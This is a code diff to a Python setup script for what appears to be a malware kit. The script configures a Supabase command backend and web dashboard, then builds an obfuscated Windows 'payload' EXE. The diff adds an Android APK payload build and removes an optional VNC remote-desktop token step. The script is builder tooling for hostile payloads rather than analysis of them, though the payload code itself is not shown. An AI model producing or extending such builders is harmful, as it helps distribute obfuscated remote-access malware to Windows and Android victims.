@@ -7,7 +7,8 @@ Interactive CLI to:
 2. Log into Supabase CLI via npx (browser-based)
 3. Apply SQL migrations & deploy edge functions
 4. Update all config files (main.go, .env, obfus.py)
-5. Build the payload using obfus.py
+5. Build the Windows payload using obfus.py
+6. Build the Android APK using build_android.py
 """
 import sys
 import os
@@ -124,15 +125,6 @@ def collect_config():
         default=""
     )
 
-    # --- VNC auth token ---
-    print()
-    if ask_yn("Enable VNC remote desktop?", default=False):
-        import secrets
-        cfg["vnc_token"] = secrets.token_hex(16)
-        log("VNC auth token generated (tunnel URL is dynamic — no build-time config needed)", "OK")
-    else:
-        cfg["vnc_token"] = ""
-
     # --- Dashboard login credentials ---
     print()
     log("Dashboard login (creates a Supabase Auth user for the web panel)")
@@ -141,7 +133,8 @@ def collect_config():
 
     # --- Build ---
     print()
-    cfg["build_payload"] = ask_yn("Build payload EXE after setup?", default=True)
+    cfg["build_payload"] = ask_yn("Build Windows payload EXE after setup?", default=True)
+    cfg["build_apk"] = ask_yn("Build Android APK after setup?", default=False)
 
     return cfg
 
@@ -212,15 +205,6 @@ def apply_config(cfg):
     replace_in_file(obfus_file,
         'https://edgqrfijgnyboeymkydu.supabase.co/functions/v1/shorten',
         shortener_fn_url)
-
-    # --- VNC auth token ---
-    if cfg.get("vnc_token"):
-        token_dir = os.path.join(root, "server")
-        os.makedirs(token_dir, exist_ok=True)
-        token_file = os.path.join(token_dir, "vnc_token.txt")
-        with open(token_file, "w") as f:
-            f.write(cfg["vnc_token"])
-        log("VNC auth token saved to server/vnc_token.txt", "OK")
 
     log("All config files updated", "OK")
 
@@ -360,6 +344,38 @@ def build_payload():
 
 
 # ============================================================
+# BUILD ANDROID APK
+# ============================================================
+
+def build_apk(cfg):
+    """Run build_android.py to build the Android APK."""
+    root = os.path.dirname(os.path.abspath(__file__))
+
+    # Check Go is installed
+    if not check_tool("go"):
+        log("Go compiler not found. Install from https://go.dev/dl/", "ERR")
+        return False
+
+    log("Starting Android APK build...")
+    print()
+
+    # Build args from config
+    args = [sys.executable, os.path.join(root, "build_android.py")]
+
+    # Extract domain from URL (e.g. https://xxx.supabase.co → xxx.supabase.co)
+    supa_domain = cfg["supa_url"].rstrip("/").replace("https://", "").replace("http://", "")
+    args.extend(["--domain", supa_domain])
+    args.extend(["--apikey", cfg["supa_anon_key"]])
+
+    if cfg.get("supa_url2"):
+        domain2 = cfg["supa_url2"].rstrip("/").replace("https://", "").replace("http://", "")
+        args.extend(["--domain2", domain2])
+
+    result = subprocess.run(args, cwd=root)
+    return result.returncode == 0
+
+
+# ============================================================
 # MAIN
 # ============================================================
 
@@ -396,14 +412,20 @@ def main():
         print()
         build_payload()
 
+    if cfg.get("build_apk"):
+        print()
+        build_apk(cfg)
+
     print()
     print("=" * 55)
     log("Setup complete!", "OK")
     print()
     log("Next steps:")
     log("  1. Start the web dashboard:  npm run dev")
-    log("  2. The built EXE is in the current directory")
-    log("  3. To rebuild later:  python3 setup.py build")
+    log("  2. Built payloads are in the current directory")
+    log("  3. To rebuild later:")
+    log("       Windows:  python3 setup.py build")
+    log("       Android:  python3 build_android.py")
     print()
 
 
